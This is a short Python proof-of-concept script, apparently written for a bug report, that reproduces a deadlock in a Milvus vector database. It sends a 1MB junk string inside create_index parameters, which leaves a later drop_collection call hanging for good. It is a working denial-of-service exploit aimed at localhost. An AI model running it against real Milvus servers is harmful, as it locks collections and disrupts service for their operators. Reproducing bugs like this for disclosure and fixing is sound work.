import time
from pymilvus import connections, utility, Collection, FieldSchema, CollectionSchema, DataType

HOST = "localhost"
PORT = "19531"

def reproduce_collection_deadlock():
    connections.connect("default", host=HOST, port=PORT)
    col_name = "deadlock_test_col"

    # 1. Clean up and prepare the target collection
    if utility.has_collection(col_name):
        utility.drop_collection(col_name)

    schema = CollectionSchema([
        FieldSchema("id", DataType.INT64, is_primary=True),
        FieldSchema("vector", DataType.FLOAT_VECTOR, dim=128)
    ])
    collection = Collection(col_name, schema)
    print(f"✅ Collection '{col_name}' created.")

    # 2. Inject a 1MB malicious payload into index params
    huge_string = "A" * (1 * 1024 * 1024)
    index_params = {
        "index_type": "FLAT",
        "metric_type": "L2",
        "params": {"malicious_padding": huge_string}
    }

    print("🔥 Sending 1MB poison payload to create_index (Waiting for timeout)...")
    try:
        # Client will timeout after 10 seconds
        collection.create_index("vector", index_params, timeout=10.0)
    except Exception as e:
        print(f"  [Observed] Client timed out as expected: {str(e)[:60]}...")

    # 3. Attempt subsequent operations on the SAME collection
    print("\n⏳ Attempting to drop the poisoned collection...")
    print("⚠️ The script will now HANG INFINITELY here without raising an error:")
    
    # This operation will block forever.
    utility.drop_collection(col_name) 
    
    print("❌ You will never see this line because the collection is deadlocked.")

if __name__ == "__main__":
    reproduce_collection_deadlock()